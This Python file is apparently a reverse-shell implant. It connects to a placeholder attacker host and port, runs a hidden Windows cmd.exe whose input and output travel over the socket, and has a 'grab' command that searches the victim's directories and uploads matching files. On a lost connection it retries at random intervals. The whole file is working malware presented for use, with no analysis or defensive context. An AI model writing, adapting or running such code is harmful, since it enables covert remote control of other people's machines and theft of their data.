# payload.py
# The Heartbeat Soul, Third Generation. Its speech is pure protocol.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch
import struct
import json

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

def send_msg(sock, data):
    """Wraps data with a 4-byte length header and sends it."""
    try:
        msg = struct.pack('>I', len(data)) + data
        sock.sendall(msg)
    except:
        pass

def recv_msg(sock):
    """Receives a 4-byte length header and then the exact amount of data."""
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen: return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        
        data = b''
        while len(data) < msglen:
            packet = sock.recv(msglen - len(data))
            if not packet: return None
            data += packet
        return data
    except:
        return None

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha256 = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                sha256.update(block)
        return sha256.hexdigest()
    except:
        return None

def find_files(start_path, patterns):
    """Recursively finds files matching a list of patterns."""
    found_files = []
    for root, _, files in os.walk(start_path):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                full_path = os.path.join(root, filename)
                if os.access(full_path, os.R_OK):
                    found_files.append(full_path)
    return found_files

def handle_grab_command(s_obj, command):
    """Handles the logic for 'grab' with the absolute protocol."""
    try:
        send_msg(s_obj, b"ACK_GRAB")

        current_path = os.getcwd()
        parts = command.strip().split()
        patterns = parts[1:]
        search_path = current_path
        
        files_to_send = find_files(search_path, patterns)
        
        for file_path in files_to_send:
            try:
                relative_path = os.path.relpath(file_path, search_path)
                file_size = os.path.getsize(file_path)
                file_hash = calculate_sha256(file_path)
                if not file_hash: continue

                header_data = {'type': 'header', 'path': relative_path, 'size': file_size, 'hash': file_hash}
                send_msg(s_obj, json.dumps(header_data).encode('utf-8'))
                
                # Wait for acknowledgment of the header before sending the file
                header_ack = recv_msg(s_obj)
                if not header_ack or json.loads(header_ack.decode('utf-8')).get('status') != 'ACK_HEADER':
                    continue # Master did not approve, skip to next file

                with open(file_path, 'rb') as f:
                    while True:
                        chunk = f.read(4096)
                        if not chunk: break
                        # Every chunk is sent as its own framed message
                        send_msg(s_obj, chunk)
                
                ack_msg = recv_msg(s_obj) # Wait for final ACK for the file

            except Exception:
                continue
    finally:
        end_data = {'type': 'end_transfer'}
        send_msg(s_obj, json.dumps(end_data).encode('utf-8'))

def run_conduit():
    """Main reverse shell loop."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
            
            stop_event = threading.Event()

            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        data = stream.read(1)
                        if data: sock.sendall(data)
                        else: break
                    except: break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data: break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()

                    if command_str.lower().startswith('grab '):
                        threading.Thread(target=handle_grab_command, args=(s_obj, command_str), daemon=True).start()
                    elif command_str.lower().startswith('cd '):
                        try:
                            target_dir = command_str.split(' ', 1)[1]
                            os.chdir(target_dir)
                        except: pass
                        p.stdin.write(data)
                        p.stdin.flush()
                    else:
                        p.stdin.write(data)
                        p.stdin.flush()
                except: break
            
            stop_event.set()
            p.terminate()
            s_obj.close()
        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()